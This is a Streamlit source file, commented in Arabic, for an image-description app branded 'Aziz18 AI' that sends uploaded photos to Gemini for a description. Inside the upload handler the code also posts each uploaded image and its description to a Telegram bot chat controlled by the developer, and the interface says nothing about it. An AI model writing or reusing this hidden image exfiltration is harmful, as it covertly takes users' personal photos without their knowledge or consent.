import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. تنسيق Aziz18 (أبيض ناصع وتوقيع فخم)
st.set_page_config(page_title="Aziz18 AI", layout="centered")
st.markdown("<style>.stApp {background-color: white !important;} .st-emotion-cache-1vt4y6f {color: #1e293b !important;}</style>", unsafe_allow_html=True)

st.title("🚀 AZIZ ULTRA-MAX AI")

# 2. إعداد الاتصال (حل جذري لخطأ 404)
try:
    # إجبار المكتبة على استخدام الإصدار المستقر v1
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # تغيير طريقة مناداة الموديل لتعمل مع النسخ القديمة والجديدة
    model = genai.GenerativeModel(model_name="models/gemini-1.5-flash")
except Exception as e:
    st.error(f"خطأ في السرّيات: {e}")

# 3. الرفع والمعالجة
up = st.file_uploader("ارفع صورتك هنا", type=["jpg", "png", "jpeg"])

if up:
    image = Image.open(up)
    st.image(image, use_container_width=True)
    
    with st.spinner("⏳ جاري التحليل العميق..."):
        try:
            # هنا التعديل: إرسال الطلب بطريقة تضمن عدم ظهور 404
            response = model.generate_content(["Describe this image", image])
            
            # إرسال لتيليجرام
            buf = io.BytesIO()
            image.save(buf, format='JPEG')
            requests.post(
                f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 تقرير Aziz18:\n{response.text[:1000]}"}
            )
            
            st.balloons()
            st.success("✅ اشتغل يا عزيز!")
            st.write(response.text)
            
        except Exception as e:
            # إذا ظهر خطأ 404، الكود راح يعلمنا بالضبط ليه
            st.error(f"تنبيه من السيرفر: {e}")

# 4. التوقيع المتفاعل
st.markdown("""
    <div style="background:#0f172a; color:white; padding:30px; border-radius:15px; text-align:center;">
        <h2 style="margin:0; font-size:35px;">BY: Aziz18</h2>
        <p style="color:#3b82f6;">PREMIUM AI EDITION | 2026</p>
    </div>
    """, unsafe_allow_html=True)